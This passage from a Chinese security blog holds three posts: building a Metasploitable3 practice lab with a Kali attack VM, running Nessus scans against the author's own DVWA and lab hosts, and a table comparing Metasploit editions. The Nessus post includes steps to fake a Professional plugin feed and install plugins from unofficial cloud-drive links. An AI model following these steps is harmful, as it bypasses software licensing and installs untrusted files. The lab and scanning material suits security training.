    <url>/aposts/f3700316/</url>
    <content><![CDATA[<h2 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h2><ul>
<li>为了练习使用Metasploit，本篇主要介绍如何搭建靶场Metasploitable3</li>
<li>本机为win10，网络为无线网络，cpu为i5，内存为8G</li>
<li><strong>本次装的靶场环境是windows_2008_r2</strong>，ubuntu_1404系统没有装</li>
</ul>
<h2 id="开始搭建"><a href="#开始搭建" class="headerlink" title="开始搭建"></a>开始搭建</h2><ul>
<li>packer我们不需要</li>
<li>打开<a href="https://www.vagrantup.com/downloads">vagrant</a>下载最新的版本，安装后要重启电脑</li>
<li>安装vagren插件</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">E:\app&gt;cd Vagrant</span><br><span class="line"></span><br><span class="line">E:\app\Vagrant&gt;vagrant plugin install vagrant-reload</span><br><span class="line">Installing the &#x27;vagrant-reload&#x27; plugin. This can take a few minutes...</span><br><span class="line">Fetching vagrant-reload-0.0.1.gem</span><br><span class="line">Installed the plugin &#x27;vagrant-reload (0.0.1)&#x27;!</span><br></pre></td></tr></table></figure>

<ul>
<li>下载<a href="https://vagrantcloud.com/rapid7/boxes/metasploitable3-win2k8/versions/0.1.0-weekly/providers/virtualbox.box">metasploitable3-win2k8.box</a>，用IDM下载后，发现名字如下：</li>
</ul>
<p><img src="/aposts/f3700316/image-20220223144417638.png" alt="image-20220223144417638"></p>
<p>重命名修改为：metasploitable3-win2k8.box</p>
<ul>
<li>打开powershell，执行脚本</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mkdir metasploitable3-workspace</span><br><span class="line">cd metasploitable3-workspace</span><br><span class="line"></span><br><span class="line">PS E:\app\metasploitable3-workspace&gt; vagrant box add rapid7/metasploitable3-win2k8 d:\exe\metasploitable3-win2k8.box</span><br><span class="line">==&gt; box: Box file was not detected as metadata. Adding it directly...</span><br><span class="line">==&gt; box: Adding box &#x27;rapid7/metasploitable3-win2k8&#x27; (v0) for provider:</span><br><span class="line">    box: Unpacking necessary files from: file:///d:/exe/metasploitable3-win2k8.box</span><br><span class="line">    box:</span><br><span class="line">==&gt; box: Successfully added box &#x27;rapid7/metasploitable3-win2k8&#x27; (v0) for &#x27;virtualbox&#x27;!</span><br><span class="line">PS E:\app\metasploitable3-workspace&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>最终生成的文件目录：C:\Users\Admin.vagrant.d\boxes\rapid7-VAGRANTSLASH-metasploitable3-win2k8\0\virtualbox</li>
</ul>
<p><img src="/aposts/f3700316/image-20220223145644884.png" alt="image-20220223145644884"></p>
<ul>
<li>复制数据元文件<code>C:\Users\Admin\.vagrant.d\boxes\rapid7-VAGRANTSLASH-metasploitable3-win2k8\0\virtualbox\metadata.json</code>到<code>C:\Users\Admin\.vagrant.d\boxes\rapid7-VAGRANTSLASH-metasploitable3-win2k8</code>目录下</li>
</ul>
<p><img src="/aposts/f3700316/image-20220223145847948.png" alt="image-20220223145847948"></p>
<ul>
<li>开始创建Metasploitable3 虚拟机，如果有发现Vagrantfile文件，先<strong>将它删除或者移到其他地方去</strong>，随后，调出命令行，输入命令<code>vagrant init rapid7/metasploitable3-win2k8</code>：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PS C:\Users\Admin\.vagrant.d\boxes\rapid7-VAGRANTSLASH-metasploitable3-win2k8\0\virtualbox&gt; vagrant init rapid7/metasploitable3-win2k8</span><br><span class="line">A `Vagrantfile` has been placed in this directory. You are now</span><br><span class="line">ready to `vagrant up` your first virtual environment! Please read</span><br><span class="line">the comments in the Vagrantfile as well as documentation on</span><br><span class="line">`vagrantup.com` for more information on using Vagrant.</span><br></pre></td></tr></table></figure>

<p>然后执行下面命令，可能出现超时，我出现了一次，然后开了个代理重试了下（不知大是否可这个有关）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vagrant up</span><br></pre></td></tr></table></figure>

<p>打开虚拟机</p>
<p><img src="/aposts/f3700316/image-20220223151549011.png" alt="image-20220223151549011"></p>
<p>输入默认密码：<strong>vagrant</strong></p>
<p><img src="/aposts/f3700316/image-20220223151748473.png" alt="image-20220223151748473"></p>
<p>登录后网络也是没有问题</p>
<p><img src="/aposts/f3700316/image-20220223151916993.png" alt="image-20220223151916993"></p>
<ul>
<li>启动两个虚拟机（一个是kail攻击机，一个是win 2008 靶场），电脑cpu直接爆满，我把靶场内存调整为了2G</li>
</ul>
<p><img src="/aposts/f3700316/image-20220223154329578.png" alt="image-20220223154329578"></p>
<h2 id="部署网络"><a href="#部署网络" class="headerlink" title="部署网络"></a>部署网络</h2><ul>
<li><p>部署好网络，把<strong>攻击机和靶机的通信网络设置的一样</strong></p>
</li>
<li><p>首先，把攻击机和靶机全部关机，然后在Oracle VM VirtualBox管理器中，点击管理——全局设定——网络，创建一个NAT网络，名字可以随意起。</p>
<p><img src="/aposts/f3700316/image-20220224104741466.png" alt="image-20220224104741466"></p>
<p><img src="/aposts/f3700316/image-20220224104800241.png" alt="image-20220224104800241"></p>
</li>
<li><p>在两个虚拟机中分别部署好网络，以刚刚安装好的靶机为例，选择该虚拟机——设置——网络，将网卡1~4全部打上勾启动网络连接，并在这四个网卡的页面中各自选择连接方式，分别为：仅主机（Host-Only）网络、内部网络、NAT网络、桥接网卡，顺序可以自由安排。对于另一个虚拟机，同样也是如上设置。四个网卡的配置如下四图：</p>
</li>
</ul>
<p><img src="/aposts/f3700316/image-20220224104852965.png" alt="image-20220224104852965"></p>
<p><img src="/aposts/f3700316/image-20220224104914609.png" alt="image-20220224104914609"></p>
<p><img src="/aposts/f3700316/image-20220224104934036.png" alt="image-20220224104934036"></p>
<p><img src="/aposts/f3700316/image-20220224104956186.png" alt="image-20220224104956186"></p>
<ul>
<li><p>这时候，两个虚拟机都已经部署完毕了，可以同时启动</p>
</li>
<li><p>启动靶场window 2008 打开cmd，ping下，发现网络是通的</p>
</li>
</ul>
<p><img src="/aposts/f3700316/image-20220224105225893.png" alt="image-20220224105225893"></p>
<ul>
<li>查看下IP，<strong>注意经过测试只有第一个ip：192.168.56.102在攻击机上，才能被访问和nmap扫描到端口</strong></li>
</ul>
<p><img src="/aposts/f3700316/image-20220224105339740.png" alt="image-20220224105339740"></p>
<ul>
<li>打开攻击机kali，在浏览器中输入：192.168.56.102</li>
</ul>
<p><img src="/aposts/f3700316/image-20220224105545840.png" alt="image-20220224105545840"></p>
<ul>
<li>用攻击机nmap扫描端口测试下<code>nmap -sV 192.168.56.102</code></li>
</ul>
<p><img src="/aposts/f3700316/image-20220224105733663.png" alt="image-20220224105733663"></p>
<ul>
<li><strong>安装步骤来源于<a href="https://jeza-chen.com/2018/09/21/MetaSploit3_Setup/">这里</a></strong></li>
<li>截止目前为止，Metasploitable3包含以下的漏洞应用或服务：具体请查看：<a href="https://github.com/rapid7/metasploitable3/wiki/Vulnerabilities">https://github.com/rapid7/metasploitable3/wiki/Vulnerabilities</a></li>
</ul>
<p><img src="/aposts/f3700316/image-20220223162222020.png" alt="image-20220223162222020"></p>
]]></content>
      <categories>
        <category>Metasploit</category>
      </categories>
      <tags>
        <tag>安全测试</tag>
        <tag>Metasploit</tag>
        <tag>环境搭建</tag>
      </tags>
  </entry>
  <entry>
    <title>Nessus实践</title>
    <url>/aposts/d1bcf07/</url>
    <content><![CDATA[<h2 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h2><ul>
<li><p>主要是针对Nessus进行实践，<strong>Nessus既可以扫描web，也可以直接扫主机</strong></p>
</li>
<li><p>本次安装环境为win10，nessus版本为8.13.1</p>
</li>
</ul>
<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><ul>
<li><p>本次安装教程主要来源于<a href="https://www.ddosi.org/nessus/">这里</a></p>
</li>
<li><p>使用迅雷网盘下载:<code>https://pan.xunlei.com/s/VMXAkJL4hXBl7V6G3rwLgl4EA1</code>提取码: zxsk</p>
</li>
<li><p>安装成功后，在浏览器（我这里谷歌打不开，换了其他浏览器）输入：<code>https://localhost:8834/</code>，选择managed</p>
</li>
</ul>
<p><img src="/aposts/d1bcf07/image-20220304100720318.png" alt="image-20220304100720318"></p>
<ul>
<li>选择Tenable.sc</li>
</ul>
<p><img src="/aposts/d1bcf07/image-20220304100823162.png" alt="image-20220304100823162"></p>
<ul>
<li>填写用户名和密码进行注册</li>
</ul>
<p><img src="/aposts/d1bcf07/image-20220304101009080.png" alt="image-20220304101009080"></p>
<ul>
<li>等待安装成功后，自带进入到：<code>https://localhost:8834/#/settings/about</code>，默认是未激活，激活后页面回出现scan菜单</li>
</ul>
<p><img src="/aposts/d1bcf07/image-20220304101350406.png" alt="image-20220304101350406"></p>
<h3 id="激活"><a href="#激活" class="headerlink" title="激活"></a>激活</h3><ul>
<li>管理员身份打开cmd输入如下命令{停止Tenable Nessus服务}</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\WINDOWS\system32&gt;net stop &quot;Tenable Nessus&quot;</span><br><span class="line">Tenable Nessus 服务正在停止.</span><br><span class="line">Tenable Nessus 服务已成功停止。</span><br></pre></td></tr></table></figure>

<ul>
<li>输入以下两个命令(更改文件属性)  ，要注意nessus的路径，替换为自己相应路径即可</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">attrib -s -r -h &quot;E:\app\Tenable\Nessus\nessus\plugins\*.*&quot; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">attrib -s -r -h &quot;E:\app\Tenable\Nessus\nessus\plugin_feed_info.inc&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>如果没有 plugin_feed_info.inc 文件,自己新建一个 plugin_feed_info.inc 文件,内容如下:</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PLUGIN_SET = &quot;202201111911&quot;;</span><br><span class="line">PLUGIN_FEED = &quot;ProfessionalFeed (Direct)&quot;;</span><br><span class="line">PLUGIN_FEED_TRANSPORT = &quot;Tenable Network Security Lightning&quot;;</span><br></pre></td></tr></table></figure>

<ul>
<li>然后把 plugin_feed_info.inc 复制到相应目录下再执行以上命令.</li>
</ul>
<h4 id="下载插件"><a href="#下载插件" class="headerlink" title="下载插件"></a>下载插件</h4><p>原文中的插件无法激活，作者推荐了他的其他博文，我把下载地址拷贝了过来：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">云中转网盘:</span><br><span class="line">https://yzzpan.com/#sharefile=fCSsVfsp_26946</span><br><span class="line">解压密码:www.ddosi.org</span><br></pre></td></tr></table></figure>

<h4 id="更新nessus插件"><a href="#更新nessus插件" class="headerlink" title="更新nessus插件"></a>更新nessus插件</h4><ul>
<li>输入下面的命令，更新插件。注意两个路径，一个是 nessus的安装路径，一个是插件位置的路径,</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;E:\app\Tenable\Nessus\nessuscli.exe&quot; update &quot;e:\exe\all-2.0_202201111911.tar.gz&quot;</span><br></pre></td></tr></table></figure>

<ul>
<li>更新成功后出现如下提示</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Fri Mar  4 10:42:22 2022][25076.1] Warning: Long rDNS lookup.  Took 2081ms for 169.254.105.105 to DESKTOP-8MTHS2J</span><br><span class="line"></span><br><span class="line">[info] Copying templates version 202102012215 to E:\app\Tenable\Nessus\nessus\templates\tmp</span><br><span class="line">[info] Finished copying templates.</span><br><span class="line">[info] Moved new templates with version 202102012215 from plugins dir.</span><br><span class="line"> * Update successful.  The changes will be automatically processed by Nessus</span><br></pre></td></tr></table></figure>

<ul>
<li>复制配置文件到文件夹，执行<code>copy </code></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\WINDOWS\system32&gt;copy &quot;E:\app\Tenable\Nessus\nessus\plugins\plugin_feed_info.inc&quot; &quot;E:\app\Tenable\Nessus\nessus\&quot;</span><br><span class="line"></span><br><span class="line">覆盖 E:\app\Tenable\Nessus\nessus\plugin_feed_info.inc 吗? (Yes/No/All): all</span><br><span class="line">已复制         1 个文件。</span><br></pre></td></tr></table></figure>

<ul>
<li>启动下服务</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\WINDOWS\system32&gt;net start &quot;Tenable Nessus&quot;</span><br><span class="line">Tenable Nessus 服务正在启动 .</span><br><span class="line">Tenable Nessus 服务已经启动成功。</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>打开<code>https://localhost:8834/#/</code> 等待自动配置完成，如果打不开，多刷新几次</li>
</ul>
<p><img src="/aposts/d1bcf07/image-20220304112142500.png" alt="image-20220304112142500"></p>
<ul>
<li>关闭服务</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net stop &quot;Tenable Nessus&quot; </span><br></pre></td></tr></table></figure>

<ul>
<li>复制插件文件</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">copy &quot;E:\app\Tenable\Nessus\nessus\plugins\plugin_feed_info.inc&quot; &quot;E:\app\Tenable\Nessus\nessus\&quot;</span><br></pre></td></tr></table></figure>

<ul>
<li>如果提示文件不存在，就手动新建<code>E:\app\Tenable\Nessus\nessus\plugins\plugin_feed_info.inc</code>内容如下</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PLUGIN_SET = &quot;202201111911&quot;;</span><br><span class="line">PLUGIN_FEED = &quot;ProfessionalFeed (Direct)&quot;;</span><br><span class="line">PLUGIN_FEED_TRANSPORT = &quot;Tenable Network Security Lightning&quot;;</span><br></pre></td></tr></table></figure>

<ul>
<li>然后再次执行copy命令</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">copy &quot;E:\app\Tenable\Nessus\nessus\plugins\plugin_feed_info.inc&quot; &quot;E:\app\Tenable\Nessus\nessus\&quot;</span><br></pre></td></tr></table></figure>

<ul>
<li>更改文件属性</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">attrib +s +r +h &quot;E:\app\Tenable\Nessus\nessus\plugins\*.*&quot; </span><br><span class="line">attrib +s +r +h &quot;E:\app\Tenable\Nessus\nessus\plugin_feed_info.inc&quot;</span><br><span class="line">attrib -s -r -h &quot;E:\app\Tenable\Nessus\nessus\plugins\plugin_feed_info.inc&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>启动服务后，打开 <code>https://localhost:8834/#/</code> 后，有几秒钟初始化，然后自动进入到输入用户名和密码</li>
</ul>
<p><img src="/aposts/d1bcf07/image-20220304105937929.png" alt="image-20220304105937929"></p>
<ul>
<li>出现如下界面，说明激活成功</li>
</ul>
<p><img src="/aposts/d1bcf07/image-20220304151256238.png" alt="image-20220304151256238"></p>
<p><img src="/aposts/d1bcf07/image-20220304160110351.png" alt="image-20220304160110351"></p>
<h2 id="实践"><a href="#实践" class="headerlink" title="实践"></a>实践</h2><ul>
<li><p>如果我们要扫描的是一个网站，我们选择<strong>Web Application Tests</strong>；</p>
</li>
<li><p>如果是要扫描一个主机的话，我们选择<strong>Advanced Scan</strong></p>
</li>
<li><p>如果要对网络中的主机进行发现和扫描，我们选择<strong>Host Discovery</strong></p>
</li>
</ul>
<h3 id="扫描网站"><a href="#扫描网站" class="headerlink" title="扫描网站"></a>扫描网站</h3><ul>
<li>本次依然是我的dvwa靶场为例子，为了模拟真实场景，把httpd的文档目录直接修改为dvwa下，这样直接访问<code>ip:port</code>就进入到靶场；端口也改回了80</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vi /etc/httpd/conf/httpd.conf</span><br><span class="line"></span><br><span class="line">DocumentRoot &quot;/var/www/html/DVWA-2.0.1&quot;</span><br><span class="line"></span><br><span class="line">systemctl restart httpd</span><br></pre></td></tr></table></figure>



<ul>
<li>新建一个扫描模板，选择Web Application Tests，settings下目标设置靶场的ip</li>
</ul>
<p><img src="/aposts/d1bcf07/image-20220304172013225.png" alt="image-20220304172013225"></p>
<ul>
<li>http登录的设置</li>
</ul>
<p><img src="/aposts/d1bcf07/image-20220307104711390.png" alt="image-20220307104711390"></p>
<ul>
<li>默认的插件如下，应该是激活问题，插件并不是很多</li>
</ul>
<p><img src="/aposts/d1bcf07/image-20220307090238888.png" alt="image-20220307090238888"></p>
<ul>
<li>点击保存后，再我的扫描列表，点击启动</li>
</ul>
<p><img src="/aposts/d1bcf07/image-20220307110902628.png" alt="image-20220307110902628"></p>
<ul>
<li>等待测试结果，用了17分钟，17个漏洞，其中4个中等漏洞</li>
</ul>
<p><img src="/aposts/d1bcf07/image-20220307104853855.png" alt="image-20220307104853855"></p>
<ul>
<li>发现大部分都是配置文件漏洞</li>
</ul>
<p><img src="/aposts/d1bcf07/image-20220307105345386.png" alt="image-20220307105345386"></p>
<ul>
<li><p>查看下载日志，发现扫描的内容的确比较简单，没有对网站本身的链接进行扫描</p>
</li>
<li><p>信息提示，也明确提示了插件需要更新的提示</p>
</li>
</ul>
<p><img src="/aposts/d1bcf07/image-20220307105553129.png" alt="image-20220307105553129"></p>
<h3 id="扫描主机"><a href="#扫描主机" class="headerlink" title="扫描主机"></a>扫描主机</h3><p>新建Advanced Scan，目标中输入主机ip</p>
<p><img src="/aposts/d1bcf07/image-20220307105922363.png" alt="image-20220307105922363"></p>
<ul>
<li>证书选项那里，分类里面我们选择host，ssh，填入ssh的用户名和rsa密钥</li>
</ul>
<p><img src="/aposts/d1bcf07/image-20220307110445759.png" alt="image-20220307110445759"></p>
<ul>
<li>密钥文件（mykey）是服务器上生成的（请自行百度），生成后的文件内容参考如下：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-----BEGIN RSA PRIVATE KEY-----</span><br><span class="line">MIIEowIBAAKCAQEAw5RpKHoP/hDYpsiLFB7oEmYk22zR2PWeAqQq4GjQDTdJL7G8...</span><br><span class="line">-----END RSA PRIVATE KEY-----</span><br></pre></td></tr></table></figure>

<ul>
<li>查看插件</li>
</ul>
<p><img src="/aposts/d1bcf07/image-20220307110719036.png" alt="image-20220307110719036"></p>
<ul>
<li>直接点击保存后，点击启动按钮</li>
</ul>
<p><img src="/aposts/d1bcf07/image-20220307110828628.png" alt="image-20220307110828628"></p>
<ul>
<li>看了下扫描结果，没有发现中级以上漏洞</li>
</ul>
<p><img src="/aposts/d1bcf07/image-20220307112447415.png" alt="image-20220307112447415"></p>
<ul>
<li>测试下扫描数据库看看，配置比较简单</li>
</ul>
<p><img src="/aposts/d1bcf07/image-20220307112743428.png" alt="image-20220307112743428"></p>
<ul>
<li>启动测试，测试结果和web的扫描结果差不多，首先把所有端口扫描出来并针对各自端口进行简单扫描，然后就针对mysql的一些设置信息</li>
</ul>
<p><img src="/aposts/d1bcf07/image-20220307144631354.png" alt="image-20220307144631354"></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>本次实践个人猜测应该和<strong>激活的插件有关</strong>，针对web网站和主机进行扫描，主要是一些配置方面的问题，建议是：</p>
<ul>
<li>对主机配置扫描，采用Nessus</li>
<li>针对web网站扫描，采用AWVS，可以<a href="/aposts/66cae209/">参考AWVS实践</a></li>
</ul>
]]></content>
      <categories>
        <category>安全测试</category>
      </categories>
      <tags>
        <tag>安全测试</tag>
        <tag>Nessus</tag>
      </tags>
  </entry>
  <entry>
    <title>Metasploit介绍</title>
    <url>/aposts/40ebc0af/</url>
    <content><![CDATA[<h2 id="各个版本介绍"><a href="#各个版本介绍" class="headerlink" title="各个版本介绍"></a>各个版本介绍</h2><table>
<thead>
<tr>
<th></th>
<th>描述</th>
<th>Metasploit Framework</th>
<th>Metasploit Community</th>
<th>Metasploit Express</th>
<th>Metasploit Pro</th>
</tr>
</thead>
<tbody><tr>
<td>Pricing</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>License</td>
<td>无IP限制</td>
<td>Free</td>
<td>Free</td>
<td>收费</td>
<td>收费</td>
</tr>
<tr>
<td>用户界面</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>Web界面</td>
<td>提供友好的web界面，大大提高效率，减少对技术培训的依赖</td>
<td>N</td>
<td>Y</td>
<td>Y</td>
<td>Y</td>
</tr>
<tr>
<td>命令行界面</td>
<td>.命令行界面</td>
<td>Y</td>
<td>N</td>
<td>N</td>
<td>Y</td>
</tr>
<tr>
<td>专业控制台</td>
<td>高级命令行功能，通过专业控制台可以使用新的更高一级的命令，更好的管理数据，整体提高效率。</td>
<td>N</td>
<td>N</td>
<td>N</td>
<td>Y</td>
</tr>
<tr>
<td>渗透测试</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>全面的exp覆盖</td>
<td>Metasploit拥有世界上最大的高质量公开攻击库</td>
<td>Y</td>
<td>Y</td>
<td>Y</td>
<td>Y</td>
</tr>
<tr>
<td>手工渗透</td>
<td>针对一台主机发动一个单一攻击</td>
<td>Y</td>
<td>Y</td>
<td>Y</td>
<td>Y</td>
</tr>
<tr>
<td>基本渗透</td>
<td>针对任意数量的主机发动一个单一攻击</td>
<td>N</td>
<td>Y</td>
<td>Y</td>
<td>Y</td>
</tr>
<tr>
<td>智能渗透</td>
<td>自动选择所有匹配的exp，进行最安全可靠的攻击测试。支持dry-run模式在发动攻击前可以清楚哪些exp会运行。</td>
<td>N</td>
<td>N</td>
<td>Y</td>
<td>Y</td>
</tr>
<tr>
<td>渗透链</td>
<td>自动组织攻击和辅助模块，例如针对思科路由器</td>
<td>N</td>
<td>N</td>
<td>N</td>
<td>Y</td>
</tr>
<tr>
<td>证据收集</td>
<td>一键收集攻陷主机的证据，包括截屏、密码、哈希值、系统信息等等</td>
<td>N</td>
<td>N</td>
<td>Y</td>
<td>Y</td>
</tr>
<tr>
<td>后渗透</td>
<td>.成功攻陷一台主机后自动发动定制的后渗透模块</td>
<td>N</td>
<td>N</td>
<td>N</td>
<td>Y</td>
</tr>
<tr>
<td>会话保持</td>
<td>连接断开后可以自动生重新连接，例如一个被钓鱼的用户关闭了自己的笔记本电脑，重新开机后会自动建立连接</td>
<td>N</td>
<td>N</td>
<td>N</td>
<td>Y</td>
</tr>
<tr>
<td>密码暴力猜测</td>
<td>快捷试验最常用的或之前捕获到的密码。如果是弱密码或pass-the-hash攻击方式，哈希值可以被自动破解。</td>
<td>N</td>
<td>N</td>
<td>Y</td>
<td>Y</td>
</tr>
<tr>
<td>社会工程学</td>
<td>模拟钓鱼攻击。创建带有恶意文件的U盘来攻击一台机器。</td>
<td>N</td>
<td>N</td>
<td>N</td>
<td>Y</td>
</tr>
<tr>
<td>Web应用测试</td>
<td>扫描、审计和攻击Web应用的漏洞，如OWASP Top10。</td>
<td>N</td>
<td>N</td>
<td>N</td>
<td>Y</td>
</tr>
<tr>
<td>IDS&#x2F;IPS 绕过</td>
<td>绕过IDS&#x2F;IPS的检测</td>
<td>N</td>
<td>N</td>
<td>N</td>
<td>Y</td>
</tr>
<tr>
<td>免杀</td>
<td>使用动态载荷绕过反病毒系统，不需要浪费时间自己编写动态载荷</td>
<td>N</td>
<td>N</td>
<td>N</td>
<td>Y</td>
</tr>
<tr>
<td>载荷生成器</td>
<td>通过快捷界面生成独立的优秀载荷</td>
<td>N</td>
<td>N</td>
<td>N</td>
<td>Y</td>
</tr>
<tr>
<td>代理跳板</td>
<td>通过一个攻陷的主机针对另一外目标发动一个攻击</td>
<td>Y</td>
<td>Y</td>
<td>Y</td>
<td>Y</td>
</tr>
<tr>
<td>VPN跳板</td>
<td>通过一台被攻陷的主机建立一个2层的网络连接通道，使您可以使用基于网络的工具，例如漏洞扫描器来得到更多的信息，以供进一步再使用更高级的技术</td>
<td>N</td>
<td>N</td>
<td>N</td>
<td>Y</td>
</tr>
<tr>
<td>报表</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>基本报表</td>
<td>生成基本的渗透测试报表，包括审计报告和被攻陷主机报告</td>
<td>N</td>
<td>N</td>
<td>Y</td>
<td>Y</td>
</tr>
<tr>
<td>高级报表</td>
<td>生成各种报表包括Web应用测试报表、社会工程学模拟报表以及种种合规报表如PCI</td>
<td>N</td>
<td>N</td>
<td>N</td>
<td>Y</td>
</tr>
<tr>
<td>效率增强</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>快速开始向导</td>
<td>执行基线渗透测试找到容易的目标、Web应用测试或模拟钓鱼攻击。通过向导可以快速入门并在向导完成后有更入的了解</td>
<td>N</td>
<td>N</td>
<td>N</td>
<td>Y</td>
</tr>
<tr>
<td>MetaModules</td>
<td>MetaModules 可 以为IT安全专家简化实施安全测试。许多安全测试技术要么基于繁琐的工具要么需要定制开发，需要花费大量的时间。为了加快这样的测 试，MetaModules 把常见但复杂的安全测试自动化，从而给人力不足的安全部门提供一个更有效的办法来完成工作。 MetaModules 包括网络分段操作和防火墙测试、被动网络发现、凭证测试和入侵等。</td>
<td>N</td>
<td>N</td>
<td>N</td>
<td>Y</td>
</tr>
<tr>
<td>发现式扫描</td>
<td>利用集成的NMAP扫描器配合高级指纹技术描绘出整个网络，并识别网络中的设备</td>
<td>N</td>
<td>Y</td>
<td>Y</td>
<td>Y</td>
</tr>
<tr>
<td>脚本重放</td>
<td>生成脚本再现攻击，从而可以测试补救工作是否有效</td>
<td>N</td>
<td>N</td>
<td>Y</td>
<td>Y</td>
</tr>
<tr>
<td>数据管理</td>
<td>在可检索的数据库中跟踪所有被发现的数据。在分组视图中找出异常值。</td>
<td>N</td>
<td>Y</td>
<td>Y</td>
<td>Y</td>
</tr>
<tr>
<td>标记</td>
<td>通过标记主机可以把主机分配给某人、标记为一个导入源、标记项目范围、或标记高价值目标。今后可以通过标记找到对应的主机。</td>
<td>N</td>
<td>N</td>
<td>N</td>
<td>Y</td>
</tr>
<tr>
<td>任务链</td>
<td>创建定制的工作流</td>
<td>N</td>
<td>N</td>
<td>N</td>
<td>Y</td>
</tr>
<tr>
<td>专业API</td>
<td>使用高级的完全文件化的API可以把Metasploit Pro集成到SIEM和GRC系统中或实现定制自动化和集成</td>
<td>N</td>
<td>N</td>
<td>N</td>
<td>Y</td>
</tr>
<tr>
<td>集成</td>
<td>开箱即用的SIEM和GRC集成</td>
<td>N</td>
<td>N</td>
<td>N</td>
<td>Y</td>
</tr>
<tr>
<td>团队协作</td>
<td>和多个队员共同协作同一个项目，分割工作量，利用不同层次的专家经验。共享所有信息燕生成一个统一报告 。</td>
<td>N</td>
<td>N</td>
<td>N</td>
<td>Y</td>
</tr>
<tr>
<td>Security Programs</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>闭环风险验证</td>
<td>验证漏洞和错误配置，从而可以对风险进行等级划分，并且可以把结果推回到Nexpose</td>
<td>N</td>
<td>N</td>
<td>N</td>
<td>Y</td>
</tr>
<tr>
<td>模拟钓鱼攻击</td>
<td>发送模拟钓鱼邮件来衡量用户的安全意识，包括多少人点击了邮件中的链接或在一个伪造的登录页面输入了登录凭证，并可以对具有危险行为的用户进行培训</td>
<td>N</td>
<td>N</td>
<td>N</td>
<td>Y</td>
</tr>
<tr>
<td>漏洞验证</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>漏洞导入</td>
<td>从Nexpose和第三方漏洞扫描系统中导入输出文件</td>
<td>Y</td>
<td>Y</td>
<td>Y</td>
<td>Y</td>
</tr>
<tr>
<td>Web漏洞导入</td>
<td>从各种第三方Web应用扫描器中改入输出文件</td>
<td>N</td>
<td>N</td>
<td>Y</td>
<td>Y</td>
</tr>
<tr>
<td>Nexpose扫描</td>
<td>在界面上直接启动一个Nexpose扫描。结果自动导入到Metasploit</td>
<td>N</td>
<td>Y</td>
<td>Y</td>
<td>Y</td>
</tr>
<tr>
<td>直接导入</td>
<td>把现有的nexpose扫描结果直接导入</td>
<td>N</td>
<td>N</td>
<td>N</td>
<td>Y</td>
</tr>
<tr>
<td>漏洞例外</td>
<td>验证后把漏洞例外推回到Nexpose，包括评论和例外时限。</td>
<td>N</td>
<td>N</td>
<td>Y</td>
<td>Y</td>
</tr>
<tr>
<td>闭环集成</td>
<td>标记并推送可以攻击的漏洞到Nexpose</td>
<td>N</td>
<td>N</td>
<td>N</td>
<td>Y</td>
</tr>
<tr>
<td>re-run Session</td>
<td>重新运行一次攻击来验证一项补救措施的效果，例如补丁是否起作用</td>
<td>N</td>
<td>N</td>
<td>Y</td>
<td>Y</td>
</tr>
<tr>
<td>支持</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>社区支持</td>
<td>在Rapid7社区中得到支持</td>
<td>Y</td>
<td>Y</td>
<td>Y</td>
<td>Y</td>
</tr>
<tr>
<td>Rapid7 支持</td>
<td>7X24小时电子邮件和电话支持</td>
<td>N</td>
<td>N</td>
<td>Y</td>
<td>Y</td>
</tr>
</tbody></table>
<h2 id="启动Metasploit"><a href="#启动Metasploit" class="headerlink" title="启动Metasploit"></a>启动Metasploit</h2><p>安装好kali系统后，可以参考我<a href="https://moon-full.gitee.io/2022/02/21/Metasploit%E4%BB%8B%E7%BB%8D/">这篇文章</a>介绍了如何在虚拟机中装kali，当前kali版本为：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">uname -a</span><br><span class="line">Linux kali 5.14.0-kali4-amd64 #1 SMP Debian 5.14.16-1kali1 (2021-11-05) x86_64 GNU/Linux</span><br></pre></td></tr></table></figure>

<p>kali默认装的是  Metasploit Framework </p>
